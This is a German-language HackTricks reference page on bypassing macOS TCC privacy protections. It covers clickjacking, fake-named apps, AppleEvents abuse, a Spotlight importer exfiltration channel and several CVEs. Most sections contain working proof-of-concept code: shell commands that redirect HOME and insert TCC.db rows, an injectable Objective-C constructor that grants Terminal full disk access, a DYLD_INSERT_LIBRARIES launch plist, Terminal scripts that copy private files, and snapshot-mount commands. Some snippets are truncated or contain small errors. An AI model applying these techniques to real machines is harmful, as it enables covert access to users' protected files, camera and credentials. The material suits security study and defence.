# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Nach Funktionalität

### Schreib-Bypass

Das ist kein Bypass, sondern einfach die Funktionsweise von TCC: **TCC schützt nicht vor Schreibzugriffen**. Wenn Terminal **keinen Lesezugriff auf den Desktop eines Benutzers hat, kann es trotzdem hineinschreiben**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Das **erweiterte Attribut `com.apple.macl`** wird der neuen **Datei** hinzugefügt, damit die **Ersteller-App** Lesezugriff darauf erhält.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Es ist möglich, **ein Fenster über der TCC-Abfrage einzublenden**, damit der Benutzer sie **akzeptiert**, ohne es zu bemerken. Einen PoC findest du unter [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Ein Angreifer kann **Apps mit beliebigem Namen** (z. B. Finder, Google Chrome ...) in der **`Info.plist`** erstellen und sie dazu bringen, Zugriff auf einen durch TCC geschützten Speicherort anzufordern. Der Benutzer glaubt dann, dass die legitime Anwendung diesen Zugriff anfordert.\
Außerdem ist es möglich, **die legitime App aus dem Dock zu entfernen und die gefälschte dort abzulegen**. Wenn der Benutzer dann auf die gefälschte App klickt (die dasselbe Symbol verwenden kann), kann sie die legitime App aufrufen, TCC-Berechtigungen anfordern und Malware ausführen. So glaubt der Benutzer, die legitime App habe den Zugriff angefordert.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Weitere Informationen und einen PoC findest du unter:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Standardmäßig hatte ein Zugriff über **SSH früher „Full Disk Access“**. Um dies zu deaktivieren, muss SSH in der Liste aufgeführt, aber deaktiviert sein (durch Entfernen aus der Liste werden diese Berechtigungen nicht entzogen):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Standardmäßig hatte ein Zugriff über SSH früher „Full Disk Access“. Um dies zu deaktivieren, muss SSH in der Liste aufgeführt, aber deaktiviert sein (durch Entfernen aus der Liste...](<../../../../../images/image (1077).png>)

Hier findest du Beispiele dafür, wie manche **Malware diesen Schutz umgehen konnte**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Beachte, dass du jetzt **Full Disk Access** benötigst, um SSH aktivieren zu können.

### Erweiterungen verarbeiten - CVE-2022-26767

Das Attribut **`com.apple.macl`** wird Dateien zugewiesen, damit **eine bestimmte Anwendung Leseberechtigung dafür erhält.** Dieses Attribut wird gesetzt, wenn eine Datei per **Drag&Drop** auf eine App gezogen wird oder wenn ein Benutzer auf eine Datei **doppelklickt**, um sie mit der **Standardanwendung** zu öffnen.

Ein Benutzer könnte daher **eine bösartige App registrieren**, die alle Erweiterungen verarbeitet, und Launch Services aufrufen, um eine beliebige Datei zu **öffnen** (sodass die bösartige Datei Leseberechtigung erhält).<sup>[[23]](#references)</sup>

### iCloud

Mit der Berechtigung **`com.apple.private.icloud-account-access`** kann mit dem XPC-Dienst **`com.apple.iCloudHelper`** kommuniziert werden, der **iCloud-Tokens bereitstellt**.

**iMovie** und **Garageband** verfügten über diese und weitere Berechtigungen.

Weitere **Informationen** zum Exploit, mit dem sich über diese Berechtigung **iCloud-Tokens abrufen lassen**, findest du im Vortrag: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Datenabfluss über Darwin-Benachrichtigungsnamen eines Spotlight-Importers

Ein Spotlight-Importer kann die Datei lesen, die Spotlight an seinen `GetMetadataForFile`-Callback übergibt, selbst wenn ein normaler Prozess ohne Full Disk Access sie nicht lesen kann. Anders als bei einer [Code-Injection in einen TCC-autorisierten Prozess](../macos-tcc-credential-and-data-theft.md) setzt dies einen lokalen Zugriff voraus, der die Installation eines Importers und ein passendes Spotlight-Indizierungsereignis ermöglicht. Der Importer ist sandboxed, aber Darwin-Benachrichtigungen, die nur einen Namen enthalten, können Bytes an einen Listener außerhalb dieser Sandbox übertragen. Dies ist ein Datenabflusskanal, kein Weg zu Root-Rechten oder beliebigem Dateizugriff durch den Importer.<sup>[[24]](#references)</sup>

Deklariere den Zieldateityp unter `CFBundleDocumentTypes` → `LSItemContentTypes` in der `Info.plist` des Importers und installiere anschließend das Bundle in `~/Library/Spotlight/` oder in `Contents/Library/Spotlight/` einer App. Prüfe die Registrierung mit `mdimport -L`. Der [Abschnitt zu Spotlight-Importern](../../../../macos-auto-start-locations.md#spotlight-plugins) behandelt die Platzierung des Bundles und den Abgleich von Dateitypen. Der Importer erhält nur Dateien, für die Spotlight ihn auswählt; ein vorhandener Importer hat normalerweise Vorrang. Unter macOS 26 Tahoe erzielte `mdimport -i` in den gemeldeten Tests nicht zuverlässig eine sofortige rekursive Indizierung, während `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` den erneuten Import von UTIs anforderte, die dieser Importer beansprucht.<sup>[[24]](#references)</sup>

Für einen Test des Kanals starte außerhalb der Sandbox einen Listener mit `notifyutil -w TEST_TEST_TEST` und sende dann eine Benachrichtigung mit `CFNotificationCenterGetDarwinNotifyCenter()` sowie `NULL` als Objekt und `userInfo`. Anders als eine verteilte Benachrichtigung mit einer `userInfo`-Nutzlast enthält die Darwin-Benachrichtigung nur ihren Namen. Für Binärdaten registriere den externen Listener mit `notify_register_dispatch` für die Dezimalnamen `0` bis `255`; ordne jeder Callback-Registrierung ihren Bytewert zu. Lies innerhalb von `GetMetadataForFile` ausschließlich den von Spotlight bereitgestellten `pathToFile` und sende jedes Byte als Dezimal-Benachrichtigungsnamen:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Der Listener rekonstruiert die Bytefolge, statt die durch TCC geschützte Datei selbst zu lesen. Der veröffentlichte PoC stellte die ersten 64 Bytes von `knowledgeC.db` auf einem Nicht-FDA-Terminal mit aktiviertem SIP unter macOS 26 wieder her. Die Bandbreite ist gering, und dies ist keine zuverlässige Methode zum massenhaften Kopieren: Spotlight indiziert eine Zieldatei möglicherweise nicht oder nicht erneut, und gleichzeitig laufende Importer-Instanzen können Benachrichtigungsströme miteinander verschachteln. Weitere Mechanismen an der Sandbox-Grenze finden Sie unter [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/).<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Eine App mit der Berechtigung **`kTCCServiceAppleEvents`** kann **andere Apps steuern**. Das bedeutet, dass sie möglicherweise **die den anderen Apps erteilten Berechtigungen missbrauchen kann**.<sup>[[2]](#references)</sup>

Weitere Informationen zu Apple Scripts finden Sie hier:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Wenn eine App beispielsweise **über die Automation-Berechtigung für `iTerm` verfügt**, kann sie iTerm steuern. In diesem Beispiel hat **`Terminal`** Zugriff auf iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Über iTerm

Terminal, das keine FDA-Berechtigung hat, kann iTerm aufrufen, das darüber verfügt, und damit Aktionen ausführen:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Über Finder

Oder wenn eine App über Finder Zugriff hat, könnte sie ein Skript wie dieses ausführen:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Nach App-Verhalten

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Der userland-**tccd daemon** verwendete die **`HOME`**-**env**-Variable, um auf die TCC-Benutzerdatenbank unter **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** zuzugreifen.

Laut [diesem Stack-Exchange-Beitrag](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) ist es möglich, **alle an den TCC daemon übergebenen Umgebungsvariablen zu kontrollieren**, da dieser über `launchd` innerhalb der Domain des aktuellen Benutzers ausgeführt wird.<sup>[[19]](#references)</sup>\
Ein **Angreifer könnte also die Umgebungsvariable `$HOME`** in **`launchctl`** so setzen, dass sie auf ein **kontrolliertes** **Verzeichnis** verweist, den **TCC** daemon **neu starten** und anschließend **die TCC-Datenbank direkt ändern**, um sich **jede verfügbare TCC-Berechtigung** zu erteilen, ohne den Endbenutzer jemals dazu aufzufordern.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes hatte Zugriff auf TCC-geschützte Speicherorte, aber eine neu erstellte Notiz wurde **an einem nicht geschützten Speicherort gespeichert**. Daher konnte ein Angreifer Notes auffordern, eine geschützte Datei in eine Notiz zu kopieren, und anschließend auf die resultierenden Daten am nicht geschützten Speicherort zugreifen:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Die Binärdatei `/usr/libexec/lsd` mit der Bibliothek `libsecurity_translocate` hatte das Entitlement `com.apple.private.nullfs_allow`, das ihr erlaubte, **nullfs**-Mounts zu erstellen, sowie das Entitlement `com.apple.private.tcc.allow` mit **`kTCCServiceSystemPolicyAllFiles`**, um auf alle Dateien zuzugreifen.

Es war möglich, das Quarantäneattribut zu „Library“ hinzuzufügen, den XPC-Dienst **`com.apple.security.translocation`** aufzurufen und so Library nach **`$TMPDIR/AppTranslocation/d/d/Library`** zu verschieben, wo auf alle Dokumente innerhalb von Library **zugegriffen werden konnte**.

### CVE-2024-44131 - FileProvider symlink race

Apps, die Dateioperationen an einen **privilegierten Helper** (hier **`fileproviderd`** / `Files.app`) übergeben, kopieren oder verschieben Elemente **im Namen des Benutzers**. Der Kopiervorgang läuft daher mit den Berechtigungen des Helpers statt mit denen des aufrufenden Prozesses.

Jamf Threat Labs zeigte, dass die vor der Operation durchgeführte Symlink-Validierung einer **Race Condition** ausgesetzt ist: Statt den Symlink auf der **letzten** Pfadkomponente zu platzieren (die überprüft wird), tauscht der Angreifer ein **übergeordnetes** Verzeichnis im Pfad **aus, nachdem der Kopiervorgang bereits begonnen hat**. Der privilegierte Helper folgt dann dem vom Angreifer kontrollierten Link und liest oder schreibt an TCC-geschützten Speicherorten, **ohne jemals eine Abfrage anzuzeigen**.<sup>[[5]](#references)</sup>

Verzeichnisse, deren Pfad **nicht** durch eine zufällige UUID geschützt ist (zum Beispiel `~/Library/Mobile Documents/com~apple~CloudDocs`), sind die einfachsten Ziele, da der Angreifer den vollständigen Pfad für die Race Condition vorhersagen kann.

> [!TIP]
> Achte auf dieses allgemeine Muster: **Jeder privilegierte Prozess, der einen Pfad mehr als einmal auflöst** (Check-then-use oder `rename()`/`copyfile()`, die Quelle und Ziel separat auflösen), kann durch den Austausch eines Verzeichnisses in der Mitte des Pfads einer Race Condition ausgesetzt werden. Nur `O_NOFOLLOW_ANY`, `openat()` auf einem bereits geöffneten Verzeichnis-FD oder `realpath()` mit erneuter Validierung schließen das Zeitfenster tatsächlich.

Weitere Informationen im [**Bericht von Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` kann mit `SQLITE_ENABLE_SQLLOG` erstellt werden, wodurch ein über Umgebungsvariablen gesteuerter Logging-Hook hinzugefügt wird ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – für **jede geöffnete Datenbank** werden eine **Kopie der Datenbankdatei** und ein Protokoll der SQL-Anweisungen in `path` geschrieben (das Verzeichnis muss bereits existieren).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bei jedem Öffnen/Anhängen einer DB eine **neue Kopie erstellen**, statt eine vorhandene wiederzuverwenden.
- **`SQLITE_SQLLOG_CONDITIONAL`** – eine Verbindung nur protokollieren, wenn neben der Haupt-DB eine Datei namens `<database>-sqllog` existiert.

Wenn du diese Variable in einen Prozess einschleusen kannst, der **FDA** besitzt und SQLite-Datenbanken öffnet, kopiert er diese geschützten Datenbanken bereitwillig in ein von dir kontrolliertes Verzeichnis. Da der Zieldateiname aus angreiferkontrollierten Daten abgeleitet wird, kann ein **am Ziel platzierter Symlink** dieselbe Primitive in einen **beliebigen Dateischreibzugriff** mit den Berechtigungen des Zielprozesses verwandeln.

### **SQLITE_AUTO_TRACE**

Wenn die Umgebungsvariable **`SQLITE_AUTO_TRACE`** gesetzt ist, beginnt die Bibliothek **`libsqlite3.dylib`**, alle SQL-Abfragen **zu protokollieren**. Viele Anwendungen verwendeten diese Bibliothek, sodass es möglich war, alle ihre SQLite-Abfragen zu protokollieren.<sup>[[22]](#references)</sup>

Mehrere Apple-Anwendungen verwendeten diese Bibliothek, um auf TCC-geschützte Informationen zuzugreifen.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Suche nach dateischreibenden Umgebungsvariablen

Die beiden vorherigen Einträge sind Beispiele derselben allgemeinen Technik, und es lohnt sich, nach weiteren zu suchen: **Frameworks, die in TCC-privilegierte Apps geladen werden, stellen oft Debugging-/Logging-Umgebungsvariablen bereit, durch die der Prozess eine Datei an einem vom Aufrufer kontrollierten Pfad erstellt**.

Vorgehensweise:

1. Wähle ein Ziel mit FDA oder einer anderen lohnenden TCC-Berechtigung (`Music`, `TV`, `Terminal`, MDM-Agents...) und liste die Frameworks auf, mit denen es verknüpft ist (`otool -L`, `vmmap`).
2. Durchsuche diese Frameworks nach `getenv`-Strings: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Setze mögliche Variablen mit `launchctl setenv NAME /path/you/control`, starte die App und beobachte mit `fs_usage -w -f filesys <pid>` oder `sudo fs_usage | grep <path>`, was sie im Dateisystem macht.
4. **Erstellt oder benennt** der Prozess eine Datei in deinem Verzeichnis um, hast du eine Schreibprimitive: Leite das Ziel auf einen Symlink um (oder race ein übergeordnetes Verzeichnis, wie oben bei CVE-2024-44131), um den Schreibvorgang auf `~/Library/Application Support/com.apple.TCC/TCC.db` umzulenken.

> [!TIP]
> Zwei Dinge schränken das ein. Erstens werden **`DYLD_*`-Variablen bei Binaries mit Hardened Runtime ignoriert**, es sei denn, die App enthält das Entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) („ein Boolean-Wert, der angibt, ob die App von Umgebungsvariablen des dynamischen Linkers beeinflusst werden darf, mit denen Code in den Prozess der App eingeschleust werden kann“) — siehe auch [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Zweitens entfernt Apple die einzelnen Framework-Debug-Variablen, sobald sie gemeldet werden. Eine Variable, die in einer macOS-Version funktioniert hat, ist daher in der nächsten oft nicht mehr vorhanden. Wenn eine App nach dem Setzen einer solchen Variable stillschweigend den Start verweigert, gehe davon aus, dass die Variable bereits gefiltert wird.<sup>[[7]](#references)[[8]](#references)</sup>

Unter [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) findest du den entsprechenden Trick mit Linker-Variablen.

### Apple Remote Desktop

Als root kannst du diesen Dienst aktivieren; der **ARD-Agent erhält dann Full Disk Access**, was ein Benutzer anschließend missbrauchen könnte, um ihn eine neue **TCC-Benutzerdatenbank** kopieren zu lassen.

## Über **NFSHomeDirectory**

TCC verwendet eine Datenbank im HOME-Ordner des Benutzers, um den Zugriff auf benutzerspezifische Ressourcen unter **$HOME/Library/Application Support/com.apple.TCC/TCC.db** zu kontrollieren.\
Wenn es dem Benutzer daher gelingt, TCC mit einer `$HOME`-Umgebungsvariable neu zu starten, die auf einen **anderen Ordner** verweist, könnte er eine neue TCC-Datenbank unter **/Library/Application Support/com.apple.TCC/TCC.db** erstellen und TCC dazu bringen, jeder App eine beliebige TCC-Berechtigung zu erteilen.

> [!TIP]
> Apple verwendet den im Profil des Benutzers gespeicherten Wert des Attributs **`NFSHomeDirectory`** als **Wert von `$HOME`**. Wenn du also eine Anwendung kompromittierst, die diesen Wert ändern darf (**`kTCCServiceSystemPolicySysAdminFiles`**), kannst du diese Option mit einem TCC-Bypass **weaponizen**.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Der **erste POC** verwendet [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) und [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), um den **HOME**-Ordner des Benutzers zu ändern.

1. Besorge dir einen _csreq_-Blob für die Ziel-App.
2. Platziere eine gefälschte _TCC.db_-Datei mit dem erforderlichen Zugriff und dem _csreq_-Blob.
3. Exportiere den Directory-Services-Eintrag des Benutzers mit [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Ändere den Directory-Services-Eintrag, um das Home-Verzeichnis des Benutzers zu ändern.
5. Importiere den geänderten Directory-Services-Eintrag mit [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stoppe das _tccd_ des Benutzers und starte den Prozess neu.

Der zweite POC verwendete **`/usr/libexec/configd`**, das `com.apple.private.tcc.allow` mit dem Wert `kTCCServiceSystemPolicySysAdminFiles` besaß.\
Es war möglich, **`configd`** mit der Option **`-t`** auszuführen, mit der ein Angreifer ein **benutzerdefiniertes zu ladendes Bundle** angeben konnte. Der Exploit **ersetzt** daher die Methode mit **`dsexport`** und **`dsimport`** zum Ändern des Home-Verzeichnisses des Benutzers durch eine **Code-Injection in `configd`**.

Weitere Informationen findest du im [**Originalbericht**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Mittels process injection

Es gibt verschiedene Techniken, um Code in einen Prozess einzuschleusen und dessen TCC-Berechtigungen zu missbrauchen:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Außerdem erfolgt die häufigste gefundene process injection zum Umgehen von TCC über **Plugins (load library)**.\
Plugins sind zusätzlicher Code, meist in Form von Bibliotheken oder plist-Dateien, der **von der Hauptanwendung geladen wird** und in deren Kontext ausgeführt wird. Wenn die Hauptanwendung also Zugriff auf durch TCC geschützte Dateien hatte (über erteilte Berechtigungen oder Entitlements), hat **auch der benutzerdefinierte Code diesen Zugriff**.

### CVE-2020-27937 - Directory Utility

Die Anwendung `/System/Library/CoreServices/Applications/Directory Utility.app` besaß das Entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, lud Plugins mit der Erweiterung **`.daplug`** und hatte **keine Hardened Runtime**.

Um diese CVE zu weaponizen, wird **`NFSHomeDirectory`** (unter Missbrauch des vorherigen Entitlements) **geändert**, um die **TCC-Datenbank des Benutzers zu übernehmen** und TCC zu umgehen.

Weitere Informationen findest du im [**Originalbericht**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Das Binary **`/usr/sbin/coreaudiod`** besaß die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.private.tcc.manager`. Das erste **ermöglichte Code-Injection**, das zweite gab ihm Zugriff auf die **Verwaltung von TCC**.

Dieses Binary konnte **Plugins von Drittanbietern** aus dem Ordner `/Library/Audio/Plug-Ins/HAL` laden. Daher war es möglich, mit diesem POC ein **Plugin zu laden und die TCC-Berechtigungen zu missbrauchen**:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Weitere Informationen finden Sie im [**Originalbericht**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL)-Plug-ins

Systemanwendungen, die einen Kamerastream über Core Media I/O öffnen (Apps mit **`kTCCServiceCamera`**), laden **diese Plug-ins in den Prozess**, die sich unter `/Library/CoreMediaIO/Plug-Ins/DAL` befinden (nicht durch SIP eingeschränkt).

Es reicht aus, dort eine Bibliothek mit einem gewöhnlichen **constructor** abzulegen, um **Code zu injizieren**.

Mehrere Apple-Anwendungen waren dafür anfällig.

### Firefox

Die Firefox-Anwendung verfügte über die Entitlements `com.apple.security.cs.disable-library-validation` und `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Weitere Informationen dazu, wie sich dies einfach ausnutzen lässt, findest du im [**Originalbericht**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Die Binärdatei `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` hatte die Entitlements **`com.apple.private.tcc.allow`** und **`com.apple.security.get-task-allow`**, wodurch Code in den Prozess injiziert und die TCC-Berechtigungen genutzt werden konnten.

### CVE-2023-26818 - Telegram

Telegram hatte die Entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** und **`com.apple.security.cs.disable-library-validation`**, sodass sich diese ausnutzen ließen, um **Zugriff auf die Berechtigungen der App zu erhalten**, etwa für Kameraaufnahmen. Die [**Payload findest du im Write-up**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Beachte, dass eine **benutzerdefinierte plist** erstellt wurde, um die Bibliothek mithilfe der Umgebungsvariablen zu laden und zu injizieren, und **`launchctl`** verwendet wurde, um sie zu starten:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Durch open-Aufrufe

Es ist möglich, **`open`** aufzurufen, selbst wenn man in einer Sandbox ausgeführt wird.

### Terminal-Skripte

Es ist ziemlich üblich, Terminal **vollen Festplattenzugriff (FDA)** zu gewähren, zumindest auf Computern, die von technikaffinen Personen genutzt werden. Außerdem ist es möglich, damit **`.terminal`**-Skripte aufzurufen.

**`.terminal`**-Skripte sind plist-Dateien wie diese, in denen der auszuführende Befehl im Schlüssel **`CommandString`** steht:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Eine Anwendung könnte ein Terminal-Skript an einem Ort wie /tmp schreiben und es mit einem Befehl wie diesem starten:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Durch Mounten

### CVE-2020-9771 - mount_apfs TCC-Umgehung und Rechteausweitung

**Jeder Benutzer** (auch Benutzer ohne Berechtigungen) kann einen Time-Machine-Snapshot erstellen und mounten und auf **ALLE Dateien** dieses Snapshots zugreifen.\
Die **einzige erforderliche Berechtigung** ist, dass die verwendete Anwendung (wie `Terminal`) über **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) verfügt. Diese Berechtigung muss von einem Administrator erteilt werden.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Obwohl die TCC-DB-Datei geschützt ist, war es möglich, eine neue TCC.db-Datei über das Verzeichnis zu mounten:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
